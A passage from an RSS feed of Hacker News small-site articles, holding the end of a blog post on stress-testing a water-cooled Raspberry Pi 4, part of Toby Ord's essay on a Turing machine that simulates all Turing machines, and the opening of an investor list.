src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-1024x576.jpg" alt="Fan Running On Radiator on Water Cooled Raspberry Pi" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator.jpg 1920w"></figure>



<p>Now let’s try and do a stress test on the water cooled Raspberry Pi to see how well this cooling system works.</p>



<h3>CPU Test At 1.5GHz</h3>



<p>With the CPU clock frequency set to the default 1.5Ghz, we start out with a temperature of around 28°C. This was in a room of around 25°C, so it was done with quite a warm ambient temperature. </p>



<figure><img data-attachment-id="8023" data-permalink="https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/start-of-run-1-5ghz/#main" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Start of run 1.5Ghz" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-300x169.png" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-1024x576.png" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-1024x576.png" alt="Start of run 1.5Ghz" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-1024x576.png" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz.png 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-of-run-1.5Ghz.png 1920w"></figure>



<p>I then did a 5-minute stress test at full CPU load.</p>



<figure><img data-attachment-id="8020" data-permalink="https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/end-of-run-1-5ghz/#main" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="End of Run 1.5Ghz" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-300x169.png" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-1024x576.png" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-1024x576.png" alt="End of Run 1.5Ghz" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-1024x576.png" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz.png 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-of-Run-1.5Ghz.png 1920w"></figure>



<p>There was a small spike initially where the temperature went up to 31°C but it stayed between 31°C and 33°C for the rest of the test and dropped off quickly when the test was stopped. </p>



<figure><img data-attachment-id="8021" data-permalink="https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/full-run-1-5ghz/#main" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Full Run 1.5GHz" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-300x169.png" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-1024x576.png" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-1024x576.png" alt="Full Run 1.5GHz" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-1024x576.png" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz.png 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Full-Run-1.5GHz.png 1920w"></figure>



<p>Here’s a graph of the CPU temperature for the duration of the test.</p>



<h3>CPU Test At 2.0GHz</h3>



<p>Now I’m going to try overclocking the Pi to test it at a higher CPU frequency. </p>



<figure><img data-attachment-id="8022" data-permalink="https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/overclocking/#main" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Overclocking to 2.0Ghz" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-300x169.png" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-1024x576.png" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-1024x576.png" alt="Overclocking to 2.0Ghz" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-1024x576.png" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking.png 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Overclocking.png 1920w"></figure>



<p>I set the CPU frequency to 2.0Ghz for this test.</p>



<p>Let’s try doing a stress test and see what we get.</p>



<figure><img data-attachment-id="8016" data-permalink="https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/start-run-2ghz/#main" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Start Run 2Ghz" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-300x169.png" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-1024x576.png" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-1024x576.png" alt="Start Run 2Ghz" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-1024x576.png" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz.png 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Start-Run-2Ghz.png 1920w"></figure>



<p>For this test we started out with a temperature of around 29°C, which then quickly spiked to 39°C when the test was started.</p>



<figure><img data-attachment-id="8017" data-permalink="https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/almost-complete-2ghz/#main" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Almost Complete 2Ghz" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-300x169.png" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-1024x576.png" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-1024x576.png" alt="Almost Complete 2Ghz" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-1024x576.png" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz.png 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Almost-Complete-2Ghz.png 1920w"></figure>



<p>The temperature the stayed around 36°C to 37°C for the rest of the test.</p>



<figure><img data-attachment-id="8019" data-permalink="https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/end-2ghz/#main" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="End 2Ghz" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-300x169.png" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-1024x576.png" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-1024x576.png" alt="End 2Ghz" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-1024x576.png" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz.png 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-1024x576.png 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-300x169.png 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-768x432.png 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz-1536x864.png 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/End-2Ghz.png 1920w"></figure>



<p>Here’s a graph of the CPU temperature for the duration of the 2Ghz test.</p>



<h2>Conclusion</h2>



<p>The water cooling system on this Pi works really well at keeping the CPU cool. Even when overclocked to 2.0Ghz, the  Raspberry Pi 4’s CPU temperature never went above 40°C. I wasn’t able to test the Pi at the maximum 2.147Ghz as my Pi wouldn’t boot up at this frequency, probably due to under-voltage. I’ll try and get this fixed and do a test at the maximum frequency as well at some stage.</p>



<p>To get an idea of whether this is worthwhile, I’m going to be comparing this water cooling system to an <a href="https://www.the-diy-life.com/diy-raspberry-pi-4-desktop-case-with-oled-stats-display/">Ice Tower</a>, a standard acrylic case and fan and then just a Pi with a static heat sink on it in the next week or two. So make sure that you check back here, or subscribe to my Youtube channel and turn on notifications so that you don’t miss out on that.</p>



<p>Let me know what you think of this water cooled Raspberry Pi 4 in the comments section below!</p>
<div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><a href="https://www.the-diy-life.com/author/mklementsme-com/"><img src="https://www.the-diy-life.com/wp-content/uploads/2019/12/Michael-Klements.jpg" alt="Michael-Klements" itemprop="image" ezimgfmt="rs rscb1 src ng ngcb1" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2019/12/Michael-Klements.jpg"></a></p><div><p>Hi, my name is Michael and I started this blog in 2016 to share my DIY journey with you. I love tinkering with electronics, making, fixing, and building – I’m always looking for new projects and exciting DIY ideas. If you do too, grab a cup of coffee and settle in, I’m happy to have you here.</p></div></div>
			</div><!-- .entry-content -->

	<!-- .entry-meta -->

</article></div>]]>
            </description>
            <link>https://www.the-diy-life.com/water-cooled-raspberry-pi-4-totally-unnecessary-but-pretty-awesome/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182414</guid>
            <pubDate>Mon, 23 Nov 2020 00:33:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to simulate everything (all at once)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182373">thread link</a>) | @optimalsolver
<br/>
November 22, 2020 | http://www.amirrorclear.net/academic/ideas/simulation/index.html | <a href="https://web.archive.org/web/*/http://www.amirrorclear.net/academic/ideas/simulation/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="87%"><p><span>How to simulate 
              everything (all at once)<br>
              </span> <span><br>
              Toby Ord<p>
              
              <strong>The Complete Turing Machine</strong></p></span></p>
            <p><span>The <em>Universal Turing Machine</em> (or 
              UTM) is well known. It is a Turing machine that takes as input a 
              binary representation of a Turing machine and a binary representation 
              of some arbitrary input and simulates the workings of the specified 
              Turing machine on the specified input. </span></p>
            <p><span><em>In what follows we'll assume three 
              tape Turing machines (input, work, output), with a binary alphabet, 
              where 0 corresponds to an unmarked square and 1 is marked. Input 
              to the Turing machine is assumed to be finite (i.e. there are only 
              finitely many 1s on the tape). While I speak of a single input, 
              it could easily encode finitely many individual binary strings into 
              the single binary string.</em></span></p>
            <p><span>Less well known is what I call the <em>Complete 
              Turing Machine</em>. It simulates in parallel all Turing machines 
              on all input. There is a small trick to this, but it is not difficult. 
              Since Turing machines can go on forever, we can't wait for one to 
              finish before simulating the next, but have to simulate them in 
              parallel. It is easy enough to simulate two Turing machines in parallel, 
              performing a step from the first then a step from the second and 
              so forth:</span></p>
            <p><span>step 1 of machine 1, step 1 of machine 
              2, <br>
              step 2 of machine 1, step 2 of machine 2, <br>
              ...</span></p>
            <p><span>This approach can only interleave finitely 
              many infinite sequences, but we require infinitely many Turing machines. 
              Thankfully, there is a well known trick to interleave infinitely 
              many infinite sequences into a single infinite sequence. For example:</span></p>
            <p><span>step 1 of machine 1, <br>
              step 2 of machine 1, step 1 of machine 2,<br>
              step 3 of machine 1, step 2 of machine 2, step 1 of machine 3<br>
              step 4 of machine 1, step 3 of machine 2, step 2 of machine 3, step 
              1 of machine 4<br>
              ...</span></p>
            <p><span>In this way, every Turing machine gets 
              to execute every step (if a Turing machine halts we just skip over 
              each remaining step allocated to it).</span></p>
            <p><span>We could specify a first draft of the Complete 
              Turing Machine in C-like pseudocode:</span></p>
            <div><p>for (i = 0; ; i++)<br>
              {<br>
              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;initialise_tm(tm[i], 
              i);</p><p>
              
              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (j = 0; j &lt;= 
              i; j++)<br>
              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;compute_next_step(tm[j]);<br>
              }</p></div>
            <p>tm[] is an (extendable) array of representations 
              of configurations of Turing machines including information about 
              their transition tables, their current tape, their current state, 
              and the location of the tape head. It starts uninitialised.</p>
            <p>initialise_tm(tm, i) is a function that 
              initialises a Turing machine representation to start in the starting 
              state, with a blank tape, the tape head at the start position, and 
              using the ith transition table (on some recursive coding of all 
              legal transition tables).</p>
            <p>compute_next_step(tm) is a function that 
              takes such a representation and simulates a single computational 
              step on it. It is a standard core part of a Universal Turing machine.</p>
            <p><span>This will simulate all Turing machines 
              (including non-terminating ones) running on a blank input tape.</span></p>
            <p><span>We actually want all Turing machines on 
              all inputs, but we can achieve this by a small modification to the 
              initialisation function. Instead of using i as a code for a transition 
              table, it now treats i as coding a pair of natural numbers (<em>x</em>, 
              <em>y</em>) (on some recursive coding of all pairs of naturals) 
              then initialises the Turing machine to use the <em>x</em>th 
              transition table and sets the input tape to the <em>y</em>th 
              input tape (on some recursive coding of all finitely marked input 
              tapes). Since the coding guarantees that all (<em>x</em>,<em>y</em>) 
              pairs will be in this list (possibly using an ordering like the 
              triangular one above), each transition table, input pair will be 
              initialised at some point and every step of their computations will 
              be run.</span></p>
            <p><span>So far so good. We now have a machine that 
              will simulate all Turing machines on all finite inputs. The existence 
              of such a Turing machine is known, but not all that well known. 
              This is a shame, because it is a pretty amazing thing: in some ways 
              much more amazing than the Universal Turing machine. Firstly, it 
              computes all Turing computable functions (and evaluates them on 
              all inputs). Obviously it also semi-computes all Turing semi-computable 
              partial functions (it evaluates them on all inputs where there is 
              a defined answer). </span></p>
            <p><span>However, thinking of what it does in terms 
              of functions misses most of the glory of this machine. Consider 
              sorting a finite list of natural numbers. This is a Turing computable 
              function, but can be done in many ways. There is quick sort, merge 
              sort, insertion sort, selection sort, bubble sort, and all their 
              friends. The CTM doesn't just sort lists, it sorts them using each 
              and every one of these distinct algorithms. It even sorts them with 
              every subtle variation on each of these algorithms.</span></p>
            <p><span>At the first level of simulation, the CTM 
              simulates all and only Turing machines. What about programs in C? 
              Or functional and logical languages such as Haskell and Prolog? 
              Or unusual models of computation like neural nets. We might think 
              that there are algorithms that can be expressed in these types of 
              languages which can't be expressed on a Turing machine and we'd 
              like to simulate these too. Well, for each of these there is a Turing 
              machine that acts as an interpreter for that language, and there 
              is also a Turing machine that uses such an interpreter to run all 
              programs in that language on all inputs (analogous to the CTM itself). 
              So the CTM simulates a Turing machine which simulates all Haskell 
              programs and another which simulates all Prolog programs and another 
              which simulates all neural networks etc. The CTM's calculation thus 
              includes simulations of all programs in all Turing complete languages 
              and sub-Turing languages (most of which are yet to be invented) 
              which are run on all inputs, but they are nested one level down 
              — simulations inside simulations.</span></p>
            <p><span>The CTM also simulates physical phenomena. 
              If our universe is Turing computable, then it will be simulated 
              by this CTM. Indeed since there are infinitely many Turing machines 
              that express the same algorithm, it will be simulated infinitely 
              many times in parallel. The CTM will also simulate it with every 
              possible recursive set of initial conditions. In between these threads 
              will be simulations of the hailstone numbers, chess, tropical cyclones, 
              the game of life, lolcats, and this entire simulation itself. </span></p>
            <p><span><strong>Adding oracular computation</strong></span></p>
            <p><span>What can't a CTM simulate?</span></p>
            <p><span>I'm sure many readers will immediately 
              think of their favourite uncomputable function or process. Others 
              will think of counting arguments: there are only a countable infinity 
              of Turing machines and there are an uncountable infinity of processes, 
              so almost all of them must be impossible to simulate. For example, 
              consider an endless simulation of an empty room with a light bulb 
              that flashes on and off: for each one minute block of time, the 
              light stays on or stays off, but at the end of each minute it may 
              or may not change to the other state. There are uncountably many 
              such sequences of flashes, as they correspond directly to the infinite 
              bitstrings (e.g. a string where the <em>n</em>th bit is 1 if and 
              only if the light is on during the <em>n</em>th minute). There are 
              thus uncountably many lightbulb simulations, and so not enough Turing 
              machines to be able to simulate all of them. Similarly, there is 
              a lightbulb simulation whose pattern of flashes spells out a lookup 
              table for the halting problem and we're going to have a lot of trouble 
              simulating that one.</span></p>
            <p><span>This is a compelling argument. Surprisingly 
              it is wrong.</span></p>
            <p><span>It turns out that we can simulate all such 
              sequences of flashing lights so long as we do them simultaneously. 
              </span></p>
            <p><span>Let's start with two parallel simulations: 
              one with the light off for the first minute and one with it on. 
              We then fork each of these simulations, simulating both ways the 
              next minute could go. We continue in this way, forking all the existing 
              simulations at each stage and having an exponentially …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.amirrorclear.net/academic/ideas/simulation/index.html">http://www.amirrorclear.net/academic/ideas/simulation/index.html</a></em></p>]]>
            </description>
            <link>http://www.amirrorclear.net/academic/ideas/simulation/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182373</guid>
            <pubDate>Mon, 23 Nov 2020 00:25:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A List of 152 Pre-Seed Investors and Venture Capital Firms]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182280">thread link</a>) | @founderhelp
<br/>
November 22, 2020 | https://www.founderhelp.co/pre-seed-vc-firms/ | <a href="https://web.archive.org/web/*/https://www.founderhelp.co/pre-seed-vc-firms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
